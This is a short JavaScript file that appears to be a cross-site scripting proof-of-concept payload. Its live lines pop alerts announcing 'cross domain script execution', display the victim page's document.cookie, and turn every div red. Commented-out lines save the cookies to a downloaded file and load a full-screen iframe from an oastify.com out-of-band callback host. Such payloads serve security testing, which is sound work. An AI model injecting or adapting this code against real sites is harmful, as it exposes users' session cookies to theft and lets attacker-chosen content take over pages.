alert("cross domain script execution done ");
// alert(<iframe=https://quouyboidt4h25chmacp9un2ut0koacz.oastify.com>);
alert("Cookies: " + document.cookie);
// Set background color to red
// document.body.style.backgroundColor = "red";
document.querySelectorAll("div").forEach(div => {
    div.style.backgroundColor = "red";
});
// const cookies = document.cookie;
// const blob = new Blob([cookies], { type: "text/plain" });
// const a = document.createElement("a");
// a.href = URL.createObjectURL(blob);
// a.download = "cookies.txt";
// document.body.appendChild(a);
// a.click();
// // document.body.removeChild(a);

// const iframe = document.createElement("iframe");
// iframe.src = "http://quouyboidt4h25chmacp9un2ut0koacz.oastify.com";
// iframe.style.position = "absolute";
// iframe.style.top = "0";
// iframe.style.left = "0";
// iframe.style.width = "100vw";
// iframe.style.height = "100vh";
// iframe.style.border = "none";
// document.body.appendChild(iframe);
